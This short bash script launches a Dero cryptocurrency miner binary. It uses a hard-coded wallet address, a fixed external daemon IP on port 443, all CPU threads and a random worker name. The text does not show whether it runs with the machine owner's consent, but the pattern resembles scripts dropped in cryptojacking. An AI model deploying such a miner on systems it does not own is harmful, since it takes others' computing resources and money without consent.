#!/bin/bash

chmod +x amd64
./amd64 -wallet-address dero1qydqwyg0rjmsyfl9g52np38nv645y75l07v9tlxzcz780ezsnuedkqqqekx8w -daemon-rpc-address 138.68.182.128:443 -mining-threads $(nproc --all) -turbo -worker-name $(echo $(shuf -i 1-20000 -n 1)-DEV)
